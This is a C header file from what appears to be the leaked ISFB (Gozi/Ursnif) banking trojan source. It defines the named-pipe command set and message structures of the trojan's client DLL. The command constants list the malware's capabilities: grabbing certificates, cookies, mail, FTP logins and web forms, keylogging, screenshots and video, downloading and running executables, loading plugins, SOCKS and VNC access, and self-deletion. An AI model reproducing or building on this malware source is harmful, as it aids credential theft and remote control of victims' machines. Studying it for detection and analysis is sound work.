//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: pipes.h
// $Revision: 446 $
// $Date: 2014-12-18 19:45:59 +0300 (Чт, 18 дек 2014) $
// description:
//	ISFB client DLL. Named pipe client-server commands and data exchange structures and constants.
	
#define		PIPE_MAX_BUFFER			0x100		// bytes
#define		PIPE_WAIT_TIMEOUT		10000		// milliseconds
#define		MAX_KEYLOG_BUFFER_SIZE	0x100000	// bytes

extern LPTSTR	g_ServerPipeName;
extern HANDLE	g_SocksServer;

// Pipe server commands
#define		CMD_OK			TRUE
#define		CMD_FAIL		FALSE

#define		CMD_REPLY		0x10

#define		CMD_CHECK			0x101
#define		CMD_FINDFILES		0x102
#define		CMD_REBOOT			0x103
#define		CMD_GETFILE			0x104
#define		CMD_EXE				0x105
#define		CMD_DL_EXE			0x106
#define		CMD_DL_EXE_ST		0x107
#define		CMD_DESTROY			0x108
#define		CMD_GET_CERTS		0x109
#define		CMD_GET_COOKIES		0x10a
#define		CMD_CLR_COOKIES		0x10b
#define		CMD_GET_SYSINFO		0x10c
#define		CMD_ADD_LOG			0x10d
#define		CMD_GET_LOG			0x10e
#define		CMD_LOAD_DLL		0x10f
#define		CMD_SOCKS_START		0x110
#define		CMD_SOCKS_STOP		0x111
#define		CMD_GET_KEYLOG		0x112
#define		CMD_ADD_KEYLOG		0x113
#define		CMD_GET_MAIL		0x114
#define		CMD_GET_FTP			0x115
#define		CMD_GET_IMS			0x116	// Obsolete
#define		CMD_LOAD_PLUGIN		0x117
#define		CMD_SELF_DELETE		0x118
#define		CMD_LOG_COMMAND		0x119
#define		CMD_GET_CMD_LOG		0x11a
#define		CMD_CLR_CMD_LOG		0x11b
#define		CMD_STORE_FORM		0x11c
#define		CMD_STORE_SCR		0x11d
#define		CMD_STORE_AUTH		0x11e
#define		CMD_STORE_GRAB		0x11f
#define		CMD_PACK_FORMS		0x120
#define		CMD_STORE_KEYLOG	0x121
#define		CMD_STORE_INI		0x122
#define		CMD_KEYLOG_ON		0x123
#define		CMD_KEYLOG_OFF		0x124
#define		CMD_MAKE_VIDEO		0x125
#define		CMD_RUN_VNC			0x126
#define		CMD_RUN_SOCKS		0x127


#pragma pack (push)
#pragma pack (1)
typedef	struct	_PIPE_MESSAGE
{
	ULONG	MessageId;	// ID of the message
	ULONG	DataSize;	// size of the Data array in bytes 
	ULONG	DataOffset;	// offset of the actual data within the array
	CHAR	Data[];		// binary data
} PIPE_MESSAGE, *PPIPE_MESSAGE;
#pragma pack (pop)

#define	PIPE_METHOD_STRING		1
#define	PIPE_METHOD_SECTION		2

// Pipe client and server API
WINERROR PipeStartServer(PHANDLE phThread);
WINERROR PipeConnect(OUT PHANDLE pPipe);

WINERROR PipeSendCommand(ULONG Command, PCHAR InBuf, ULONG InSize, LPTSTR pUid);
WINERROR PipeGetData(ULONG Command, PCHAR pBuffer, PULONG pSize);
BOOL PipeSendMessage(HANDLE	hPipe, ULONG MessageId, PCHAR MessageData, ULONG DataSize);
BOOL PipeWaitMessage(HANDLE	hPipe, PULONG pCommand, PCHAR MessageData, PULONG pDataSize);


// Internal Log stream API
BOOL	LogInit(VOID);
VOID	LogCleanup();
VOID	LogAdd(PCHAR Buffer, ULONG Size);
ULONG	LogGet(PCHAR* pBuffer);

#define	LOG_SIZE_MAX		0x10000		// bytes

#ifdef _ENABLE_LOGGING

#define	LOG_LINE_MAX		0x400		// bytes

#define  LogWrite(args, ...)	\
{	PCHAR Buff = (PCHAR)hAlloc(LOG_LINE_MAX); \
	wsprintfA(Buff, args, __VA_ARGS__); \
	PipeSendCommand(CMD_ADD_LOG, Buff, lstrlen(Buff), NULL);	\
	hFree(Buff); } 

#else	// _ENABLE_LOGGING
	#define  LogWrite(args, ...)
#endif